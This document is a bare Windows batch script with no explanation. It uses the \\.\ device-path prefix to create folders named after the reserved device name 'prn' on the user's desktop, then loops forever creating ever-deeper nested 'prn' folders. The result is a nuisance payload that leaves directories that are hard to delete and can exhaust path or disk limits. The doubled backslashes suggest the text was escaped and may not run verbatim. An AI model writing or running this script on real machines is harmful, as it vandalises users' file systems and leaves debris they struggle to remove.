md\\.\\%userprofile%\\desktop\\prn\\
set "dirri=%userprofile%\\desktop\\prn\\"
:loop
md\\.\\%dirri%\\prn\\
set "dirri2=%dirri%\\prn\\"
md\\.\\%dirri2%\\prn\\
set "dirri=%dirri2%\\prn\\"
goto loop